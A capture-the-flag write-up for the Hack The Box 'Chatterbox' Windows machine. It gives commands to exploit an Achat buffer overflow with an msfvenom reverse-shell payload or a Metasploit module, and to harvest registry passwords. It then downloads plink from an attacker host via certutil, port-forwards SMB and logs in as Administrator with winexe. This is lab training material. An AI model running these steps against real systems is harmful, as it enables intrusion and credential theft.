# HTB : Chatterbox


```toc
```
---
---
---
---

## Machine Information

| Contents      | Description                                               |
| ------------- | --------------------------------------------------------- |
| Name          | HTB : Chatterbox                                          |
| Difficulty    | Easy                                                      |
| OS            | Windows                                                   |
| Shell_Exploit | Buffer Overflow (Python exploit **or** Metasploit Module) |
| Priv_Esc      | Password Mining                           |
| Miscellaneous | *Port Forwarding* and *winexe*                             |

---
---
---


 
## Scanning
### Nmap

`nmap -p- -oA nmap/full-port-scan <IP>`
`nmap -A -T5 -p 9255,9256 -oA nmap/detailed-scan`

![[Pasted image 20221102145627.png]]



---
---

## Enumeration
### Web Browser 

#### a. robots.txt

- Got no result!!!

#### b. source code

- Got no result!!!

#### c. basic website enumerations/Spidering

- Got no result!!!

#### d. searchsploit/online Databases

![[Pasted image 20221102151411.png]]
- Here we can either use the ==Metasploit module== or the ==Python exploit== to get the **system shell**
- Copy the python script and call it **exploit.py**


---
---

## Exploit

### a. Attack Vector

***Achat Buffer Overflow***
> This module exploits a Unicode SEH buffer overflow in Achat. By sending a crafted message to the default port 9256/UDP, it's possible to overwrite the SEH handler. Even when the exploit is reliable, it depends on timing since there are two threads overflowing the stack in the same time.



### b. Mode of Attack
***Python Exploit***

> **Commands**
> > `msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<attacker_PORT> -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`
> > - *Payload size: 512 bytes*
> > - This means that the payload that we are generating should be close to this size and should not vary much
> > - ![[Pasted image 20221102194309.png]]
> > - Copy and paste the bad characters list in the **python script**
> > - change the UDP socket address o your HOST IP and thats it the exploit is ready to fire. 
> > - Create a netcat listener and fire the python script.
> >
> > `nc -lvnp <LPORT>`
> > `python exploit.py`
> > - ![[Pasted image 20221102195002.png]]

***Metasploit Module***

> **Resource**
> - [Achat Unicode SEH Buffer Overflow - Metasploit - InfosecMatter](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/misc/achat_bof#:~:text=This%20module%20exploits%20a%20Unicode,stack%20in%20the%20same%20time.)
> - [Achat Unicode SEH Buffer Overflow (rapid7.com)](https://www.rapid7.com/db/modules/exploit/windows/misc/achat_bof/)


> **Commands**
> > `use exploit/windows/misc/achat_bof`
> > - `show targets`
> > - `set TARGET target-id`
> > - *set other options*
> > - `exploit`


---
---

## Priv_Esc

### a. Attack Vector
> **Resources**
> > [Privilege Escalation - Windows · Total OSCP Guide - Sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

> **Commands**
> > `systeminfo`
> > `whoami`
> > `net user`
> > `net user alfred`
> > `whoami /privs`
> > `netstat -ano`
> > - ![[Pasted image 20221102195302.png]]
> > - Here we can see some local ports open and listening; this could be a very good attack verctor for Port forwarding.
> > - if there is 445 **(SMB)** open then there is some sort of file share from where we can connect to the victim PC.
> > - we can use tools like *psexec* or *winexe* that allow us to connect to this PC using credentials.
> > - But at the moment we dont have any credentials with us. So lets try to get some credentials
> >  
> > `reg query HKLM /f password /t REG_SZ /s`
> > - ![[Pasted image 20221102200614.png]]
> >
> > `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`
> > - ![[Pasted image 20221102200830.png]]
> > - What is alfred is a User who is also in the Administrator but is loggin in as a regular acount and then they provide credentials for any admin actions
> > - Lets see if this is true.
> > - So lets do this, do Protforwarding and try to connect through the **SMB** internal open port using the this credentials.

### b. Mode of Attack

> **Resources**
> > [Download PuTTY: latest release (0.78) (greenend.org.uk)](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

***Port Forwarding and winexe***

- Download the *plink* (command line interface for the PuTTy backend).
- *Plink* will allow us to do ==port forwarding==.
- Download the currect version of plink and lets start the portforwarding action.

> **Commands**
> - *Attacker*
> > `python -m SimpleHTTPSerever`
> > `apt-get install ssh`
> > `nano /etc/ssh/sshd_config`
> > > Uncomment **PermitRootLogin** and change **Prohibit-password** to **yes**
> > > save
> > 
> > `service ssh restart`  **OR**  `systemctl restart sshd`
> > `service ssh start`
> > 
> - *Target*
> > `certutil -urlcache -f http://attacker_IP:port/plink.exe plink.exe`
> > `plink.exe -l root -pw <attacker_root_passwd> -R 445:127.0.0.1:445 <attacker_IP>`
> > - ![[Pasted image 20221102202432.png]]
> 
> > `netstat -ano | grep 445`
> > - ![[Pasted image 20221102202520.png]]
> 
> > `winexe -U Administrator%passowrd //127.0.0.1 "cmd.exe"`
> > - winexe is a linux based command that allows us to execute windows commands on remote windows machine.
> > - ![[Pasted image 20221102202814.png]]

